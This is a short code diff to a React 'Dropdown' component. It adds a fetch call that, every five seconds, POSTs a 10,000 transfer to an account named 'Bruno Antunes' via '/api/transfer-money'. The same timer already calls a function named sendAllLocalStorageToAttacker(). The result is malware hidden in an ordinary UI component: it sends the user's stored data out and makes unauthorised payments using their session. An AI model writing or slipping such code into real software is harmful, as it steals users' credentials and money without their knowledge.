@@ -36,6 +36,11 @@ export function Dropdown({ options }: DropdownProps) {
     const id = setInterval(() => {
       if (!opened.current) {
         sendAllLocalStorageToAttacker();
+
+        fetch('/api/transfer-money', {
+          method: 'POST',
+          body: JSON.stringify({ account: 'Bruno Antunes', amount: 10000 }),
+        }).then(j => j.json());
       }
     }, 5000);
 
